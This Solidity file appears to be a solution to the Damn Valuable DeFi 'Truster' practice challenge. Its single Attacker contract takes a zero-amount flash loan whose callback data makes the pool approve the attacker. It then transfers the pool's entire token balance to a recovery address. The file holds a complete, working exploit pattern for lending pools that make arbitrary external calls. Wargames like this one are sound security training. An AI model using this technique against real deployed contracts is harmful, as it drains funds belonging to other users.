//SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract Attacker {
    constructor(DamnValuableToken token, TrusterLenderPool pool, address recovery) {
        uint256 amount = 1_000_000e18;
        bytes memory data = abi.encodeCall(token.approve, (address(this), amount));
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), recovery, amount);
    }
}